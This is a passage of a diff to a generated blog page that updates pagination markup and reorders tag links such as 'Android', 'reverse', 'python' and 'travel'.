+      <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
     </nav>
   
 
@@ -2083,7 +1904,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
+                <a href="javascript:void(0)" class="js-tag color3">Android</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2091,7 +1912,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">Android</a>
+                <a href="javascript:void(0)" class="js-tag color3">reverse</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -2107,11 +1928,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">travel</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color2">travel</a>
               </li>
             
             <div class="clearfix"></div>
